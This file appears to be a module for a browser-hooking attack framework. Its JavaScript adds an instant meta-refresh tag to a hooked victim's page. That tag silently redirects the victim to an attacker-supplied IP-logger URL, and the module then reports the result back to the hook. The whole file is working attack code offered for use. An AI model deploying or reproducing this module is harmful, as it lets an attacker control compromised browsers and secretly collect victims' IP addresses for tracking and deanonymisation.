/*

NAME: META_REDIRECT_TO_IP_LOGGER

DESCRIPTION: It use meta refresh html tag (generated with js) to redirect user to an IPLogger ( or whenever )

AUTHOR: jomoza

DATE: 12-04-2023

COMMAND: None

OPTIONS: {"URL_LOGGER"}

TYPE: js

*/

hihookS.id=getHibroHookId();
hihookS.result="Client redirected to HIBRO::URL_LOGGER"
hihookS.data=""

var meta = document.createElement('meta');
meta.httpEquiv = "refresh";
meta.content = "0;URL='HIBRO::URL_LOGGER'";
document.getElementsByTagName('head')[0].appendChild(meta);
